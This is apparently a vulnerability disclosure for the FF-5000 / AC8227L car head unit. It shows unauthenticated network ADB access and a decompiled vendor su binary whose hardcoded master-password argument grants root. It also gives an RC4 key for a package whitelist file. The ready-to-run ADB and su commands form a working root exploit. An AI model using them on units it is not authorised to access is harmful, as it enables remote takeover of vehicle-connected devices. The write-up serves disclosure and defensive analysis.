# Root on the FF-5000 / AC8227L

Two independent ways in: an **unauthenticated network ADB shell**, and a **hardcoded
backdoor in the vendor `su` binary** that turns that (unprivileged) shell into root.

<a name="adb"></a>
## 1. Unauthenticated ADB over the network
The firmware starts `adbd` on **TCP 5555** and `ro.adb.secure` is empty, so there is **no
RSA-key authorisation prompt** — anyone who can reach the unit on the network gets a shell:

```
adb connect <unit-ip>:5555
adb shell          # uid=2000(shell), SELinux permissive, ro.debuggable=1
```

No pairing, no confirmation dialog. On a unit that joins Wi-Fi (hotspot, home network,
etc.) this is remotely reachable. The shell is uid 2000 — unprivileged — which is where
the `su` backdoor below comes in.

## 2. The `su` backdoor
`/system/xbin/su` is setuid-root (`-rwsr-xr-x root`), a small (~20 KB) stripped ARM
binary. Decompiled, its `main()` gates root like this (Ghidra output, cleaned up):

```c
if ( ( argc != 2
       || strcmp(argv[1], "@#zxcvbnmasdfghjklqwertyuiop1234567890,.") != 0 )
     && check_permission(argc, argv) == 0 )
{
    error(1, 0, "not allowed");
}
// ... falls through to setgid(0); setuid(0); execvp("/system/bin/sh") ...
```

If `su` is invoked with **exactly one argument equal to the literal string**

```
@#zxcvbnmasdfghjklqwertyuiop1234567890,.
```

the `&&` short-circuits and **`check_permission` is never called** — no caller whitelist,
no socket, no daemon. `su` then sets uid/gid 0 (the defaults) and execs a shell. Because
`su` is setuid-root, euid is already 0 at exec, so this works from the unprivileged
uid-2000 ADB shell:

```
/system/xbin/su "@#zxcvbnmasdfghjklqwertyuiop1234567890,."
# -> root shell
```

That string is a vendor master password baked into the binary. It is the same across
units that ship this `su`.

## 3. The legitimate whitelist path (`check_permission`)
When `su` is called *without* the magic string, `check_permission()` decides access by the
**calling package**, not by any password. It:

1. Reads `/proc/<getppid()>/cmdline` to get the caller's package name.
2. Compares it against a **hardcoded array** of allowed packages, e.g.
   `com.ts.MainUI`, `com.forfan.xfapp`, `com.ts.canupdate`,
   `com.kingwaytek.{naviking3d,installer,autoking}`, `com.ts.tts_touch`,
   `com.android.launcher`, `com.googlecode.droidwall.free`.
3. If `/system/for_TW.cfg` exists, also compares against a second hardcoded array.
4. Reads `/system/pkg.bin` (256 bytes), which is **RC4-encrypted with the key
   `lbdzjzlzq`**, decrypts it to a newline-separated package list, and compares each.
   On the analysed unit that blob decrypts to:
   `com.forfan.upgrade`, `com.forfan.tsmqtt`, `com.ts.car.client`,
   `com.forfan.skinstore`, `com.mgo.carcerebrum`, `com.ts.tscanupdate`.
5. Only for `com.forfan.xfapp`: a challenge/response over a TCP socket to `127.0.0.1`
   using an `md5sum -b` call (`popen`).

So the "normal" design is: whitelisted vendor/partner apps get silent root by package
name. `pkg.bin` can be decrypted (and re-encrypted) with the included tool:
[tools/rc4_pkg.py](tools/rc4_pkg.py), key `lbdzjzlzq`.

## Why this matters
- Any process that can exec `su` with the magic string is root — including a network ADB
  shell, which itself needs no authentication. That is remote, unauthenticated root on a
  device that drives on the vehicle's CAN bus.
- The whitelist path means a number of vendor/partner packages (including a cloud client,
  `com.ts.car.client`) hold silent root by design.

## Reproduction notes
Pull your own `/system/xbin/su` and `/system/pkg.bin` over ADB and analyse them; the
decompilation above is from a disassembler (Ghidra). Nothing here depends on binaries
shipped in this repo.
